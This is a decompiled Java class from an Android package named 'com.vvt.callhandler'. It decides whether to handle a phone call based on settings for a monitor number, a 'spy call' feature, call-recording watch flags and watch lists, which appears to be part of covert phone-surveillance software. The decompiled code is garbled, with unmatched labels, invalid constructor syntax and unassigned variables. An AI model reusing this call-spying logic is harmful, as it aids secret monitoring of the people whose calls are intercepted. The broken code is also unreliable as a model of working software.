package com.vvt.callhandler;

import com.vvt.preference.FxPrefCommonList;
import com.vvt.preference.FxPreferenceException;
import com.vvt.preference.FxPreferenceType;
import com.vvt.preference.PrefCallRecordingWatchFlag;
import com.vvt.preference.PrefSpyCall;
import com.vvt.preference.PrefWatchList;
import com.vvt.preference.b;
import java.util.ArrayList;
import java.util.Collection;
import java.util.List;

public class k
{
  private static final boolean a = com.vvt.ak.a.a;
  private static final boolean b = com.vvt.ak.a.c;
  private static final boolean c = com.vvt.ak.a.e;
  
  public static boolean a(l paraml, List paramList1, int paramInt, List paramList2, String paramString)
  {
    boolean bool = a;
    if (bool) {}
    return a(true, paramInt, paraml, paramList1, paramList2, paramString);
  }
  
  public static boolean a(l paraml, List paramList, PrefWatchList paramPrefWatchList, String paramString)
  {
    boolean bool1 = paramPrefWatchList.isEnabled();
    int i = paramPrefWatchList.getWatchFlag();
    boolean bool2 = a;
    if (bool2) {}
    List localList = paramPrefWatchList.getList();
    return a(bool1, i, paraml, paramList, localList, paramString);
  }
  
  public static boolean a(String paramString, b paramb)
  {
    i = 1;
    boolean bool1 = false;
    for (;;)
    {
      try
      {
        localObject1 = FxPreferenceType.MONITOR_NUMBER;
        localObject1 = paramb.a((FxPreferenceType)localObject1);
        localObject1 = (FxPrefCommonList)localObject1;
        localArrayList = new java/util/ArrayList;
        localArrayList.<init>();
        localObject1 = ((FxPrefCommonList)localObject1).getList();
        localArrayList.addAll((Collection)localObject1);
        bool2 = com.vvt.ah.a.a(localArrayList, paramString);
        bool3 = a;
        if (!bool3) {}
      }
      catch (FxPreferenceException localFxPreferenceException1)
      {
        Object localObject1;
        boolean bool2;
        boolean bool3;
        boolean bool5;
        int j;
        int k;
        label148:
        int n;
        label167:
        label188:
        label206:
        label231:
        label243:
        bool4 = c;
        if (!bool4) {
          continue;
        }
        continue;
      }
      try
      {
        localObject1 = FxPreferenceType.SPY_CALL;
        localObject1 = paramb.a((FxPreferenceType)localObject1);
        localObject1 = (PrefSpyCall)localObject1;
        bool5 = ((PrefSpyCall)localObject1).isSpyCallEnabled();
        bool3 = a;
        if (!bool3) {}
      }
      catch (FxPreferenceException localFxPreferenceException2)
      {
        bool4 = c;
        if (bool4) {}
      }
    }
    try
    {
      localObject1 = FxPreferenceType.CALL_RECORDING_WATCH_FLAG;
      localObject1 = paramb.a((FxPreferenceType)localObject1);
      localObject1 = (PrefCallRecordingWatchFlag)localObject1;
      j = ((PrefCallRecordingWatchFlag)localObject1).getCallRecWatchFlag();
      k = j & 0x1;
      if (i != k) {
        break label290;
      }
      m = i;
    }
    catch (FxPreferenceException localFxPreferenceException3)
    {
      bool4 = c;
      if (!bool4) {
        break label243;
      }
      break label243;
      m = 0;
      break label148;
      bool6 = false;
      localArrayList = null;
      break label167;
      bool4 = false;
      Object localObject2 = null;
      break label188;
      bool4 = false;
      localObject2 = null;
      break label206;
      i = 0;
      break label231;
    }
    k = 2;
    n = j & 0x2;
    if (k == n)
    {
      k = i;
      n = 8;
      j &= 0x8;
      if (n != j) {
        break label305;
      }
      j = i;
      if ((m == 0) || (k == 0) || (j == 0)) {
        break label314;
      }
      j = i;
      bool6 = a;
      if ((bool6) && ((!bool2) || (bool5) || (j == 0))) {
        break label323;
      }
      bool4 = a;
      if (bool4) {}
      bool1 = i;
      return bool1;
    }
  }
  
  private static boolean a(boolean paramBoolean, int paramInt, l paraml, List paramList1, List paramList2, String paramString)
  {
    int i = 1;
    boolean bool1 = false;
    boolean bool2;
    int i1;
    if ((paramBoolean) && (paramInt > 0))
    {
      bool2 = com.vvt.ah.a.a(paramList1, paramString);
      int j = paramInt & 0x1;
      if (i != j) {
        break label115;
      }
      int m = i;
      k = 2;
      i1 = paramInt & 0x2;
      if (k != i1) {
        break label121;
      }
      int i2 = i;
      label57:
      k = 4;
      i1 = paramInt & 0x4;
      if (k != i1) {
        break label127;
      }
      i1 = i;
      label76:
      k = 8;
      int i4 = paramInt & 0x8;
      if (k != i4) {
        break label133;
      }
    }
    label115:
    int n;
    label121:
    int i3;
    label127:
    label133:
    for (int k = i;; k = 0)
    {
      if (!bool2) {
        break label139;
      }
      i = a;
      if (i != 0) {}
      return bool1;
      n = 0;
      break;
      i3 = 0;
      break label57;
      i1 = 0;
      break label76;
    }
    label139:
    if ((n != 0) || (i3 != 0))
    {
      bool2 = paraml.b(paramString);
      boolean bool3 = a;
      if ((bool3) && (((n == 0) || (!bool2)) && ((i3 == 0) || (bool2)))) {
        break label250;
      }
    }
    for (;;)
    {
      bool1 = i;
      if ((!bool1) && (i1 != 0))
      {
        bool1 = com.vvt.ah.a.a(paramList2, paramString);
        i = a;
        if (i == 0) {}
      }
      if ((bool1) || (k == 0)) {
        break;
      }
      bool1 = com.vvt.ah.a.c(paramString);
      i = a;
      if (i == 0) {
        break;
      }
      break;
      label250:
      i = 0;
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/callhandler/k.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */